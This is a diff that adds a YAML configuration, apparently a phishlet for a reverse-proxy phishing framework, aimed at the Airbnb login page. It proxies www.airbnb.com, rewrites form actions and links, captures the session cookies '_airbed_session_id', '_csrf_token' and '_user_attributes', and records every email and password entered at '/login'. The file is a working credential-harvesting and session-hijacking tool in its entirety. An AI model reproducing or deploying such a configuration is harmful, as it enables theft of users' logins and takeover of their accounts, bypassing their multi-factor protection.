@@ -1,0 +1,19 @@
+name: 'airbnb'
+author: '@michael738943'
+min_ver: '2.1.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'airbnb.com', session: true, is_landing: true}
+sub_filters:
+  - {hostname: 'www.airbnb.com', sub: 'www', domain: 'airbnb.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'www.airbnb.com', sub: 'www', domain: 'airbnb.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.airbnb.com'
+    keys: ['_airbed_session_id','_csrf_token','_user_attributes']
+user_regex:
+  key: 'email'
+  re: '(.*)'
+pass_regex:
+  key: 'password'
+  re: '(.*)'
+landing_path:
+  - '/login'
